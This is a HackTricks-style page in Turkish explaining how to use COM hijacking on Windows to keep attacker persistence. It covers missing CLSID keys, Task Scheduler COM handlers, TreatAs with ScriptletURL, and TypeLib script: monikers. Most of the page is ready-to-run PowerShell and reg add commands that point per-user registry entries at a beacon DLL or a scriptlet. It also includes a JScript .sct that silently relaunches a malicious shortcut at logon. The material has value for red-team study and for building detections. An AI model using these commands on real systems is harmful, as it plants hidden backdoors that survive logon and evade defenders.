# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Var olmayan COM bileşenlerini arama

HKCU değerleri kullanıcılar tarafından değiştirilebildiğinden, **COM Hijacking** bir **persistence mechanism** olarak kullanılabilir. `procmon` kullanarak henüz mevcut olmayan ve bir attacker tarafından oluşturulabilecek COM registry kayıtlarını bulmak kolaydır. Klasik filtreler:

- **RegOpenKey** işlemleri.
- _Result_ değerinin **NAME NOT FOUND** olması.
- _Path_ değerinin **InprocServer32** ile bitmesi.

Hunting sırasında kullanılabilecek faydalı varyasyonlar:

- Eksik **`LocalServer32`** anahtarlarını da arayın. Bazı COM sınıfları out-of-process server olarak çalışır ve bir DLL yerine attacker-controlled bir EXE başlatır.
- `InprocServer32`'ye ek olarak **`TreatAs`** ve **`ScriptletURL`** registry işlemlerini arayın. Güncel detection içerikleri ve malware writeup'ları bunları özellikle vurgulamaya devam ediyor; çünkü normal COM kayıtlarına göre çok daha nadirdir ve bu nedenle high-signal niteliğindedir.
- Bir kaydı HKCU'ya clone ederken orijinal `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` kaydındaki meşru **`ThreadingModel`** değerini kopyalayın. Yanlış model kullanmak activation işlemini bozabilir ve hijack işleminin fark edilmesini kolaylaştırabilir.<sup>[[3]](#references)</sup>
- 64-bit sistemlerde hem 64-bit hem de 32-bit görünümleri (`procmon.exe` ve `procmon64.exe`, `HKLM\Software\Classes` ve `HKLM\Software\Classes\WOW6432Node`) inceleyin; çünkü 32-bit uygulamalar farklı bir COM registration çözümleyebilir.

Hangi var olmayan COM'u impersonate edeceğinize karar verdikten sonra aşağıdaki komutları çalıştırın. _Birkaç saniyede bir yüklenen bir COM'u impersonate etmeye karar verirseniz dikkatli olun; bu gereğinden fazla gürültü oluşturabilir._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijack edilebilir Task Scheduler COM bileşenleri

Windows Tasks, COM objects çağırmak için Custom Triggers kullanır ve Task Scheduler üzerinden çalıştırıldıkları için ne zaman tetikleneceklerini tahmin etmek daha kolaydır.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Çıktıyı kontrol ederek, örneğin **her kullanıcı login olduğunda** çalıştırılacak olanlardan birini seçebilirsiniz.

Şimdi **{1936ED8A-BD93-3213-E325-F38D112938EF}** CLSID'sini **HKEY\CLASSES\ROOT\CLSID** içinde ve HKLM ile HKCU'da aradığınızda, genellikle değerin HKCU'da mevcut olmadığını görürsünüz.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Ardından HKCU girdisini oluşturmanız yeterlidir; kullanıcı her oturum açtığında backdoor'unuz çalıştırılır.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs`, bir CLSID'nin başka bir CLSID tarafından emüle edilmesini sağlar.<sup>[[4]](#references)</sup> Offensive perspective açısından bu, orijinal CLSID'yi değiştirmeden bırakabileceğiniz, `scrobj.dll`'ye işaret eden ikinci bir per-user CLSID oluşturabileceğiniz ve ardından gerçek COM nesnesini `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` ile kötü amaçlı olana yönlendirebileceğiniz anlamına gelir.

Bu yöntem şu durumlarda kullanışlıdır:

- hedef uygulama, logon sırasında veya uygulama başlatıldığında zaten sabit bir CLSID oluşturuyorsa
- orijinal `InprocServer32` değerini değiştirmek yerine yalnızca registry üzerinden bir yönlendirme istiyorsanız
- `ScriptletURL` değerini kullanarak yerel veya uzak bir `.sct` scriptlet'ini çalıştırmak istiyorsanız

Örnek iş akışı (public Atomic Red Team tradecraft ve daha eski COM registry abuse araştırmalarından uyarlanmıştır):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notlar:

- `scrobj.dll`, `ScriptletURL` değerini okur ve başvurulan `.sct` dosyasını çalıştırır; bu nedenle payload'u yerel bir dosya olarak tutabilir veya HTTP/HTTPS üzerinden uzaktan çekebilirsiniz.
- Orijinal COM kaydı HKLM içinde eksiksiz ve kararlı olduğunda `TreatAs` özellikle kullanışlıdır; çünkü tüm ağacı kopyalamak yerine yalnızca kullanıcı başına küçük bir yönlendirme eklemeniz yeterlidir.
- Doğal trigger'ı beklemeden doğrulama yapmak için, hedef class STA activation'ı destekliyorsa fake ProgID/CLSID'yi `rundll32.exe -sta <ProgID-or-CLSID>` ile manuel olarak instantiate edebilirsiniz.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib), COM interface'lerini tanımlar ve `LoadTypeLib()` üzerinden yüklenir. Bir COM server instantiate edildiğinde işletim sistemi, `HKCR\TypeLib\{LIBID}` altındaki registry key'lerine başvurarak ilişkili TypeLib'i de yükleyebilir. TypeLib path'i `script:C:\...\evil.sct` gibi bir **moniker** ile değiştirilirse Windows, TypeLib çözümlendiğinde scriptlet'i çalıştırır; böylece yaygın component'lere dokunulduğunda trigger olan gizli bir persistence elde edilir.

Bu durum, Microsoft Web Browser control üzerinde gözlemlenmiştir (Internet Explorer, WebBrowser embed eden uygulamalar ve hatta `explorer.exe` tarafından sıklıkla yüklenir).<sup>[[1]](#references)[[2]](#references)</sup>

### Adımlar (PowerShell)

1) Yüksek frequency'li bir CLSID tarafından kullanılan TypeLib'i (LIBID) belirleyin. Malware chain'lerinde sıklıkla abuse edilen örnek CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Kullanıcı başına TypeLib yolunu `script:` moniker'ını kullanarak yerel bir scriptlet'e yönlendirin (admin hakları gerekmez):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Ana payload'unuzu (ör. ilk zincir tarafından kullanılan bir `.lnk`) yeniden başlatan minimal bir JScript `.sct` bırakın:
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – IE'yi, WebBrowser control içeren bir uygulamayı veya rutin Explorer etkinliğini açmak TypeLib'i yükler ve scriptlet'i çalıştırarak zincirinizi oturum açma/yeniden başlatma sırasında yeniden etkinleştirir.

Cleanup
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notlar
- Aynı mantığı diğer yüksek frekanslı COM bileşenlerine de uygulayabilirsiniz; her zaman önce `HKCR\CLSID\{CLSID}\TypeLib` yolundan gerçek `LIBID` değerini çözümleyin.
- 64-bit sistemlerde 64-bit tüketiciler için `win64` alt anahtarını da doldurabilirsiniz.

## Referanslar

- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
